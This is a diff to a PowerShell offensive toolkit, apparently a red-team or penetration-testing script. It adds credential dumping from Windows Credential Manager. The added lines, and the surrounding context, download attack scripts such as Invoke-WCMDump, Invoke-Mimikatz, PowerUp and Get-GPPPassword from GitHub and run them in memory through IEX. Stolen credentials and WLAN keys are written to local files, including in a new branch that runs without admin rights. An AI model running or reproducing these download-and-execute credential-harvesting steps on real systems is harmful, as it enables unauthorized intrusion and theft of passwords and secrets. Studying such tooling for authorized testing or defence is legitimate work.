@@ -195,6 +195,10 @@ function Mimikatzlocal {
     {
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1')
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
+
+            Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
+            Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
             
             $output_file = Read-Host -Prompt 'Save credentials to a local text file? (yes/no)'
             if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
@@ -209,7 +213,13 @@ function Mimikatzlocal {
             Get-WLAN-Keys
             }
     }
-    else{Write-Host -ForegroundColor Yellow 'You need local admin rights for this!'}
+    else
+    {
+        Write-Host -ForegroundColor Yellow 'You need local admin rights for this, only dumping Credential Manager now!'
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
+        Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
+        Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
+    }
 
 }
 
@@ -281,7 +291,9 @@ function domainreconmodules
             
             Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
             Get-ExploitableSystem >> $currentPath\DomainRecon\ExploitableSystems.txt
-            
+
+            ## TODO Invoke-WebRequest -Uri 'https://github.com/NetSPI/goddi/releases/download/v1.1/goddi-windows-amd64.exe' -Outfile $currentPath\Recon.exe
+
 
             #Powerview
             Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
@@ -329,7 +341,11 @@ function privescmodules
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1')
-    
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
+
+    Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
+    Invoke-WCMDump >> $currentPath\LocalPrivesc\WCMCredentials.txt
+
     Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'
 
     Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
@@ -539,7 +555,6 @@ function proxydetect
              #Proxy
             Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
             $Wcl = new-object System.Net.WebClient
-            
             $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         }
         else
